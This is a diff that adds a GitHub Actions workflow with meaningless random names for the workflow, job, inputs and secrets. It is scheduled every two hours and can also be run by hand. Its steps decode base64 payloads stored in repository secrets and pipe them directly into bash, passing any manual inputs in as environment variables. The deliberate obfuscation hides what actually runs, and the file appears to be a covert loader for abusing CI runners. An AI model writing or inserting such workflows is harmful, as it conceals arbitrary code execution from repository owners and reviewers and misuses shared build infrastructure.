@@ -1,0 +1,33 @@
+name: OKKzweKWzy
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+    inputs:
+      lkFeQguzdjtL:
+        required: false
+      jRpzlmJ:
+        required: false
+      WJlwoIytiVwX:
+        required: false
+      fZshXOXdr:
+        required: false
+      uWhMahGhtd:
+        required: false
+jobs:
+  NZkGTTEO:
+    runs-on: ubuntu-latest
+    env:
+      IpViGI: ${{ secrets.BIAdxhAeMRJb }}
+    steps:
+      - uses: actions/checkout@v5
+      - if: github.event.inputs.lkFeQguzdjtL == ''
+        run: echo "${{ secrets.kKbCiYrwY }}" | base64 -d | bash
+      - if: github.event.inputs.lkFeQguzdjtL != ''
+        run: echo "${{ secrets.lDafmx }}" | base64 -d | bash
+        env:
+          oZwTLnjsx: ${{ github.event.inputs.lkFeQguzdjtL }}
+          aXBDMluA: ${{ github.event.inputs.jRpzlmJ }}
+          SElOfVllIbgF: ${{ github.event.inputs.WJlwoIytiVwX }}
+          CdTgEaCpDrtf: ${{ github.event.inputs.fZshXOXdr }}
+          tXXMdpt: ${{ github.event.inputs.uWhMahGhtd }}
